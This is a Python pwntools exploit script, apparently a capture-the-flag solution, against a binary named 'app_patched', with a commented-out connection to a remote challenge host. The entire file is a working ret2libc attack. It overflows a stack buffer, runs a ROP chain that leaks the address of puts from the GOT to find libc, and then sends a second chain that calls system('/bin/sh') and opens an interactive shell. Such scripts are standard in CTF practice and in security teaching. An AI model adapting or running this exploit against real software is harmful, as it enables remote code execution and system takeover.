from pwn import *
import string


context.log_level = 'info'
context.arch = 'amd64'
context.os = 'linux'

gdb_script = f"""
xuntil vuln
nextret
xuntil vuln
nextret
 """
# p = gdb.debug("./app_patched", gdbscript=gdb_script)
e = ELF("app_patched")
p = process("./app_patched")
# p = remote("inst-xtyj06zsmb.tls.vuln.si", 443, ssl=True)

#gadgets
leave_ret = p64(0x4011fa)
ret = p64(0x40101a)
pop_rdi_ret = p64(0x401283)
leave_ret = p64(0x4011fa)
main = p64(0x4011fc)

#data
libc_puts_offset = 0x84420

padding = b'A' * 96
# rbp = p64(0xdeadbeefdeadbeef)
# rip = p64(0xCAFEBABECAFEBABE)

initial_chain = b""
initial_chain += ret
initial_chain += pop_rdi_ret
initial_chain += p64(e.got["puts"])
# initial_chain += ret
initial_chain += p64(e.plt["puts"])
initial_chain += main


initial_payload = padding + p64(0xdeadbeef) + initial_chain
p.send(initial_payload)

p.recvuntil(":)\n")
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
system_off = 0x52290
binsh_off =  0x1b45bd
libc_offset = leaked_puts - libc_puts_offset
print(f"Received libc offset: {hex(libc_offset)}")
libc_system = p64(libc_offset + system_off)
print(f"Target system call: {hex(libc_offset + system_off)}")
print(f"Target binsh string: {hex(libc_offset + binsh_off)}")

print("Sending second payload")
p.recvuntil("ts!\n")
second_chain = b""
# second_chain += ret
second_chain += pop_rdi_ret
second_chain += p64(binsh_off+libc_offset)
second_chain += libc_system
second_payload = b'A'*103 + second_chain
p.sendline(second_payload)
p.interactive()
